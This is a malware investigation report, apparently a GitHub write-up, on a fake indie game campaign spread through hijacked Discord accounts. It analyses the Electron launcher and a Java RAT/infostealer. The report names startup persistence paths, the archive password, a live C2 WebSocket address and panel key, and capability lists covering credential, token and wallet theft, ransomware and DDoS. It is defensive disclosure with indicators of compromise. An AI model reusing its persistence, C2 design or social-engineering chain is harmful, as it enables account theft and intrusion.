# Inner Evil - Investigation of a Fake Game, Infostealer and RAT Campaign
A few days ago I was browsing the **Hack Smarter** Discord server looking for free cybersecurity courses when I noticed someone asking for help removing malware from their computer.\
<img src="https://raw.githubusercontent.com/Devs123Easy/Inner-Evil-Investigation/refs/heads/main/resources/Kodo's_messages_in_the_Hack_Smarter_discord.png" alt="Kodo's messages in the Hack Smarter discord server" width="192" height="378" align="center">\

That person also happens to be a viewer of **No Text To Speech** and is present in the NTTS Discord community.

I contacted him because I have experience with cybersecurity and malware analysis and offered to help. For privacy reasons, I will refer to him as Kodo throughout this report.\
<img src="https://raw.githubusercontent.com/Devs123Easy/Inner-Evil-Investigation/refs/heads/main/resources/Reaching_out_to_kodo.png" alt="Kodo's messages in the Hack Smarter discord server" width="435" height="253" align="center">\
## How the infection started
Kodo explained that one day a friend contacted him on Discord and told him about a new game that he had supposedly developed together with some friends.\
<img src="https://raw.githubusercontent.com/Devs123Easy/Inner-Evil-Investigation/refs/heads/main/resources/Pls_download-1.png" alt="The hacked friend saying that they made a game" width="519" height="132" align="center">\
The friend asked Kodo whether he wanted to test the game.

Kodo agreed. After all, the message came from someone he trusted.

The "friend" then sent him a [Youtube video](https://www.youtube.com/watch?v=69-XiNqIch4) showcasing the supposed game. The video's description linked to what was presented as the game's [official website](https://playevilinnerbeta.github.io/)\
<img src="https://raw.githubusercontent.com/Devs123Easy/Inner-Evil-Investigation/refs/heads/main/resources/Pls_download-2.png" alt="The hacked friend saying that they made a game" width="411" height="362" align="center">\
If the original YouTube video is removed, I archived a copy here:
[Archived Inner Evil trailer](https://github.com/Devs123Easy/Inner-Evil-Investigation/blob/main/resources/Inner-Evil-Game-Trailer_Youtube.mp4)\
<img src="https://raw.githubusercontent.com/Devs123Easy/Inner-Evil-Investigation/refs/heads/main/resources/Pls_download-3.png" alt="The hacked friend saying that they made a game" width="353" height="234" align="center">\
## Suspicious YouTube comments
One thing immediately stood out.

There did not appear to be a single comment warning that the download was malicious. All visible comments were positive.

I submitted my own warning comment. YouTube did not display an error and, from my logged-in account, the comment appeared to have been posted successfully.

However, when I opened the same video in a fresh incognito window without being signed into YouTube, my comment was not visible.

I cannot conclusively determine from this alone whether comments were being manually moderated, filtered by YouTube, or otherwise hidden. However, the lack of visible negative feedback made the video appear significantly more trustworthy than it actually was.
## The fake game website
The video description redirects victims to:

https://playevilinnerbeta.github.io/

The site is hosted using GitHub Pages and is designed to resemble a legitimate indie game website.

Visually, it is fairly convincing. It contains promotional artwork, game descriptions and a prominent download button.

The actual ZIP file is hosted on Dropbox: [Dropbox link](https://www.dropbox.com/scl/fi/3x8ynjm9fmnph6f2pj7lb/InnerEvil.zip?rlkey=qh0nij8p9i0usk9iiw4lkdg34&st=qoyzfoip&dl=1)

If that file is removed, I have retained an archived copy for research purposes. I am intentionally not placing the live malware binary directly in the public GitHub repository.

Using GitHub Pages or Dropbox does not by itself prove malicious intent, since both are legitimate services. In this case, however, they form part of a larger social-engineering chain that ultimately delivers the malicious executable.

## An amusing website artifact
While archiving the website, I noticed that one of the main banner images had the filename:

[ChatGPT_Image_Feb_27_2026_09_38_14_AM.png](https://github.com/Devs123Easy/Inner-Evil-Investigation/blob/main/Inner%20Evil%20Webste%20Archived%2025.07.2026/playevilinnerbeta.github.io/public/ChatGPT_Image_Feb_27_2026_09_38_14_AM.png)

This strongly suggests that at least some of the promotional artwork was AI-generated.

The website also contains metadata intended for embedding on platforms other than Discord, including Facebook and X/Twitter.

That does not prove that the malware was actively distributed on those platforms, but it does show that the website itself was designed to present well when shared outside Discord.
# What happens when the victim runs it?
When the downloaded program is executed, the victim is shown a fake error claiming that their version of DirectX is too old to run the game.\
<img src="https://raw.githubusercontent.com/Devs123Easy/Inner-Evil-Investigation/refs/heads/main/resources/Fake_error_after_running.jpg" alt="The hacked friend saying that they made a game" width="652" height="489" align="center">\
There is even a **Run Diagnostics** button.

Unsurprisingly, the button doesn't do anything.

By the time the victim is looking at the fake error, the malicious code is already executing in the background.
# Reverse engineering the launcher
Initially I attempted to inspect the executable using normal native C/C++ reverse-engineering tools.

That was not particularly useful because the main launcher is an Electron application.

After opening the executable with 7-Zip and extracting the Electron resources, I found:
```
resources/
└── app.asar
```
After extracting app.asar using Node.js and the Electron ASAR tooling, its interesting files included:
```
data.7z
launcher1.js
package.json
node_modules/
```
The `package.json` identifies `launcher1.js` as the application's entry point:
```
{
  "name": "innerevillauncher",
  "version": "4.2.1",
  "main": "launcher1.js",
  "dependencies": {
    "7zip-bin": "^5.2.0"
  }
}
```
The `launcher1.js` was obfuscated, but the first layer of obfuscation was relatively weak. It was mostly Base64 data combined with a reversible byte transformation.\
The deobfuscated launcher is available here: [launcher1_deobfuscated.js](https://github.com/Devs123Easy/Inner-Evil-Investigation/blob/main/app.asar/luancher1_deobfuscated.js)\
The password embedded in the launcher for the bundled data.7z archive is:
```
V9niA8IkAjh3
```
# Launcher behaviour
The Electron launcher begins by creating well hidden browser window. It also contains special handling for macOS that attempts to hide the application's Dock icon.

That part is worth noting, but it should not be confused with the actual payload being fully cross-platform.

The launcher then initializes logging, locates its bundled 7-Zip executable and calls its main startup routine.
## Persistence
One of the first important functions is `setupStartup()`.

The launcher determines the path of the executable that originally started it and obtains its filename.

It then copies the executable into the user's temporary directory and records its name in:
```
%TEMP%\.exename
```
The launcher also creates a VBScript in:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```
The VBS is used to start the copied executable automatically when the user logs into Windows. Before launching it, the script creates:
```
%TEMP%\.startup_mode
```
and starts the malware with flag:
```
--startup
```
This gives the launcher two separate ways to detect that it was started through persistence.\
The startup code then launches another copy of itself hidden and detached from the original process.
## Installing the Java payload
The main payload is installed under:
```
%LOCALAPPDATA%\emre
```
The launcher looks for a Java runtime in several possible bundled locations.

It then extracts data.7z using the embedded 7-Zip binary.

The archive ultimately contains the actual Java malware:
```
%LOCALAPPDATA%\emre\emre.jar
```
The launcher creates a marker file:
```
.jar_ready
```
which is intended to indicate that extraction completed successfully.

Interestingly, the current launcher still performs a fresh extraction even when the marker already exists. A comment in the source confirms this claim:
```java
// Always re-extract to ensure fresh JAR
```
In other words, `.jar_ready` is no longer used to skip installation. It is mostly an installation-state marker.

After extraction, the launcher checks whether it was started through the Startup VBS by looking for either:
```
--startup
```
or:
```
%TEMP%\.startup_mode
```
Finally, it launches:
```
java -jar emre.jar
```
and, when appropriate:
```
java -jar emre.jar --startup
```
# The actual payload: `emre.jar`
This is where the project becomes significantly more interesting.

The JAR manifest contains:
```
Manifest-Version: 1.0
Main-Class: com.bd6b087ac7.Cbd6b087ac7489
Implementation-Title: Exastealer
Implementation-Version: 1.0
```
So the malware identifies itself internally as 
```
Exastealer 1.0
```
The main class is:
```
com.bd6b087ac7.Cbd6b087ac7489
```
The class and package names are clearly obfuscated.

More importantly, the functionality I found shows that describing this sample as merely an "infostealer" understates what it can do.

It contains functionality characteristic of a full **remote-access trojan combined with an information stealer**.
# Malware capabilities
## Browser credential theft
One module, `Cbd6b087ac7276`, is dedicated to extracting browser data.\
Its methods include functionality for:
```
getMasterKey
decryptEncryptedValue
decryptChromiumPassword
extractChromiumProfile
extractFirefoxProfile
findChromiumProfiles
findChromiumCookiesDbs
```
The malware attempts to access Chromium browser encryption keys and uses Windows DPAPI as part of its decryption process. The decompiled code directly calls the payload's DPAPI decryption routines.

The underlying cryptographic module also contains functions relating to:
```
DPAPI
CNG
AES-GCM
Firefox
Yandex
```
This means the malware is designed to recover data such as saved credentials, cookies and other browser profile information.
## Discord token theft
Another module, `Cbd6b087ac7200` contains:
```
getTokens
getDiscordAppTokens
getBrowserTokens
searchTokens
isValidDiscordToken
tryDecryptToken
getDetailedTokenData
killDiscord
```
This is particularly relevant to the infection chain because compromising a Discord account gives the attacker a very effective way of spreading the scam.

A victim's account can potentially become the next account telling friends:
> "Hey, I made a game. Can you test it?"

That is a classic trust-chain propagation mechanism.
## Cryptocurrency wallets
The class:
```
Cbd6b087ac7515
```
contains a method named:
```
collectWallets()
```
and ZIP-handling functionality used to package collected files.
## Screenshots and live screen streaming
The RAT component can capture screenshots using Java's Robot.`createScreenCapture()`.

The resulting image is converted to bytes, Base64-encoded and placed into the response data.

The same class also contains functionality for:
```
startScreenStream
stopScreenStream
handleVncInput
```
## Remote file manager
The RAT can remotely perform operations including:
```
list files
download files
upload files
delete files
rename files
move files
execute files
create archives
extract archives
drop files
```
Those capabilities are exposed through methods such as:
```
handleFileList
handleFileDownload
handleFileUpload
handleFileDelete
handleFileRename
handleFileExecute
handleFileArchive
handleFileExtract
handleFileDrop
```
## Remote chat
The malware contains a surprisingly elaborate chat component.

It can create a Swing window on the victim's computer and exchange messages between the attacker and victim.

Functions and methods include:
```
handleChat
handleOpenChat
handleChatImage
handleChatReply
createChatWindow
handleCloseChat
```
So the operator can literally open a custom chat window on an infected machine.
## Keylogging
The remote-control subsystem also contains:
```
handleGetKeylogs()
```
This indicates that keylogging data can be retrieved remotely.
## Fake setup/error windows
The JAR contains HTML resources including:
```
beta-game-setup.html
mc-client-setup.html
fake-error.html
```
Another class contains functionality such as:
```
show(...)
extractHtmlToTemp(...)
openInBrowser(...)
findBrowser()
cleanup()
```
These resources explain the fake installers and error screens shown to victims.

Some of the fake interfaces contain amusingly static values. For example, the displayed storage bar claims the machine has approximately the same disk usage regardless of the actual host.

The installer resources also contain numerous translations, suggesting that the social-engineering component was designed to look usable to victims in multiple regions.
## Ransomware functionality
One of the most concerning classes is:
```
Cbd6b087ac7350
```
It contains functions and methods including:
```
startRansomware
decryptFiles
walkAndEncrypt
walkAndDecrypt
encryptFile
getTargetPaths
killProcesses
setWallpaper
saveCurrentWallpaper
restoreWallpaper
hideDesktopFiles
unhideDesktopFiles
```
So the payload contains an actual file-encryption component rather than merely displaying a fake ransomware message.
## Privilege escalation and SYSTEM impersonation
Another subsystem is heavily Windows-specific.

`Cbd6b087ac7282` contains:
```
enablePrivilege
findSystemProcess
startTrustedInstallerService
impersonateSystem
relaunchElevated
killBrowserProcesses
```
There is also another native-oriented class containing:
```
reconstructNativeDll
loadNativeLibrary
masqueradePEB
runElevatedMemoryInjection
loadEmbeddedUACExe
runElevatedExeFallback
isAdmin
elevateAndRelaunch
```
This strongly reinforces that the real payload is primarily designed for Windows.
## Discord/client injection
The class:
```
Cbd6b087ac7560
```
contains:
```
getEmbeddedInjectorCode()
inject()
```
Combined with the Discord-specific credential theft elsewhere in the sample, this appears to be part of the malware's client-injection functionality.
## DDoS functionality
Yes, the malware also contains a DDoS module.\
`Cbd6b087ac7695` implements:
```
startAttack
httpFlood
tcpFlood
udpFlood
```
The C2 layer can invoke this functionality remotely using the control panel.
# C2 communications
One of the most useful classes for understanding the malware is:
```
Cbd6b087ac7641
```
It imports:
```java
org.java_websocket.client.WebSocketClient
```
and stores a global:
```java
public static WebSocketClient wsClient;
```
After deobfuscating its string constants, the C2 WebSocket endpoint resolves to:
```
ws://40.76.119.174:3001/ws
```
The important part is that this is:
```
ws://
```
rather than:
```
wss://
```
so the WebSocket transport itself is not protected by TLS.

The malware creates the connection with:
```java
new WebSocketClient(new URI(API_URL))
```
and calls:
```java
wsClient.connect();
```
## Initial registration
When the WebSocket connection opens, the malware constructs a JSON object containing information identifying the infected machine.

The code adds the supplied panel key, its HWID value and system/user information before sending the JSON over the WebSocket.

The hard-coded panel key in this sample is:
```
PANEL-WPWG-AQDS-AGIC
```
The main class passes this value to the C2 module.

Interestingly, what the malware calls its `HWID` is initialized from a Windows environment variable rather than being a sophisticated hardware fingerprint.
## Receiving commands
Incoming WebSocket messages are parsed as JSON:
```java
JsonParser.parseString(message).getAsJsonObject();
```
The malware extracts the requested command and optional parameters, creates a response object, and dispatches most commands to:
```java
Cbd6b087ac7530.handleCommand(...)
```
After execution, the response is sent back through the same WebSocket:
```java
this.send(response.toString());
```
Conceptually, the protocol looks like this:
```
                    C2 SERVER
          ws://40.76.119.174:3001/ws
                       │
                       │ WebSocket
                       │
             ┌─────────▼─────────┐
             │ Infected machine  │
             │     emre.jar      │
             └─────────┬─────────┘
                       │
               machine registers
                       │
                       ▼
        key / host / user / OS information

                       ▲
                       │
                 JSON command
                       │
                       ▼

             handleCommand(...)
                 │
     ┌───────────┼───────────────┐
     │           │               │
 screenshots   files           VNC
 chat          keylogs         etc.
     │           │               │
     └───────────┼───────────────┘
                 │
                 ▼
             JSON response
                 │
                 └──────────────► C2
```
The RAT also checks whether its WebSocket is open before transmitting data:
```java
if (Cbd6b087ac7641.wsClient != null &&
    Cbd6b087ac7641.wsClient.isOpen()) {
    Cbd6b087ac7641.wsClient.send(...);
}
```
This pattern appears throughout the remote-control code.

If the connection closes, `onClose()` invokes:
```
reconnectAfterDelay();
```
so losing the C2 connection does not permanently disable the implant.
## Remote shell
The C2 handler also contains functionality that reaches:
```java
Runtime.getRuntime().exec(...)
```
for remotely supplied commands.

In practical terms, this means that once the RAT is connected, the attacker is not restricted to the predefined buttons/features of the malware panel.

They can potentially execute operating-system commands on the victim's machine.

That substantially increases the severity of the compromise.
# Why this campaign is particularly effective
The technical sophistication is only part of the story.

The strongest part of the campaign is arguably the social engineering.

The victim does not receive a random `.exe` from an unknown account.

Instead, the chain looks something like this:
```
Compromise Discord account
        ↓
Message victim's friends
        ↓
"I made a game, can you test it?"
        ↓
Professional-looking YouTube trailer
        ↓
Professional-looking website
        ↓
Fake game download
        ↓
Victim executes launcher
        ↓
Discord tokens / credentials stolen
        ↓
Potentially compromise another Discord account
        ↓
      Repeat
```
That trust chain is much more convincing than a traditional unsolicited malware link.
# Creating an anti-malware utility
I became sufficiently invested in helping Kodo that I used the indicators gathered during the investigation to build a cleanup and detection utility specifically for this campaign.

It can be found here:

[InnerEvilCleaner v1.2](https://github.com/Devs123Easy/Inner-Evil-Investigation/tree/main/InnerEvilCleaner%20v1.2)

The utility checks for and removes/quarantines known artifacts associated with the launcher and payload, including persistence mechanisms, temporary marker files, installation directories and related indicators.

It can also add network blocks for known infrastructure associated with the sample.

Obviously, a purpose-built cleaner is not a substitute for rebuilding a system after a confirmed high-impact compromise.

Considering that this malware can steal browser credentials and tokens, execute remote commands, impersonate privileged Windows contexts and provide remote access, the safest response to a confirmed infection is still to:

1. Disconnect the affected machine from the network.
2. Change important passwords from a separate trusted device.
3. Revoke active sessions, particularly Discord, email and browser-synchronized accounts.
4. Rotate cryptocurrency wallet credentials/seeds where relevant.
5. Reinstall Windows from trusted installation media if high assurance is required.
6. Restore only verified clean data.
# Conclusion
Initially, Inner Evil looked like a fairly ordinary "fake indie game" malware campaign.

The deeper I went, the more functionality appeared.

The final chain contains:
```
Fake game
→ YouTube promotion
→ GitHub Pages website
→ Dropbox download
→ Electron launcher
→ Startup persistence
→ encrypted data.7z
→ Java payload
→ credential stealer
→ Discord token stealer
→ wallet collector
→ RAT
→ VNC
→ remote file manager
→ remote shell
→ keylogging
→ ransomware functionality
→ privilege escalation
→ DDoS functionality
```
One correction is important regarding operating-system compatibility.

The **Electron launcher contains SOME cross-platform code**, such as macOS Dock-hiding behaviour, and Java itself is inherently cross-platform.

However, the actual malicious payload analysed here contains numerous Windows-specific mechanisms - including DPAPI credential decryption, Windows privilege manipulation, TrustedInstaller interaction, PEB masquerading and Windows process handling.

For that reason, I would currently describe this sample as:

> **A Windows-focused RAT/infostealer delivered through a partially cross-platform Electron launcher.**

I would not claim that the complete malware is confirmed to infect macOS or Linux without separately testing and analysing those execution paths.

Another interesting detail is the collection of reusable fake setup pages inside the payload.\
For example:\
[mc-client-setup.html](https://github.com/Devs123Easy/Inner-Evil-Investigation/blob/main/resources/fake-errors/mc-client-setup.html)\
[beta-game-setup.html](https://github.com/Devs123Easy/Inner-Evil-Investigation/blob/main/resources/fake-errors/beta-game-setup.html)
That suggests the same payload could potentially be repackaged under multiple social-engineering themes instead of being permanently tied to the "Inner Evil" game.

A fake Minecraft launcher would be an obvious example, similar in concept to the [Minecraft Launcher Downloader scam](https://www.youtube.com/watch?v=kVQfwL2ZMkQ).

All additional archived material, screenshots, resources and reverse-engineering work related to the investigation can be found here: [Inner Evil Investigation - Resources](https://github.com/Devs123Easy/Inner-Evil-Investigation/tree/main/resources)
## Indicators of Compromise
For defenders investigating the same sample, the most useful currently identified indicators include:
```
C2 WebSocket:
ws://40.76.119.174:3001/ws

C2 IP:
40.76.119.174

Known installation directory:
%LOCALAPPDATA%\emre

Launcher marker:
%TEMP%\.exename

Startup marker:
%TEMP%\.startup_mode

Launcher debug log:
%TEMP%\launcher_debug.log

Payload:
emre.jar

Payload SHA256:
188316726E0615DC4A63BEDB478B4EA2D6B2AF8ED427AF3FF20C3B1B6B336890 

Data.7z SHA256:
A1778C6D463C44FD6C5C26D40B672D89690AC4C75815C6E57205943630AD97B2

Original .zip archive SHA256:
InnerEvil.zip
B622A676F993645C522E2C8C5DED9BE41CBEDB5ABB020890E432237BB44C27A2

Original launcher executable SHA256:
InnerEvilLauncher.exe
64FF7D1D6E9977DE1D11372F969F799D2EE8BD3FAFB8893446DF7CF9FA8689B6

JAR identity:
Implementation-Title: Exastealer
Implementation-Version: 1.0

Panel/sample key:
PANEL-WPWG-AQDS-AGIC
```
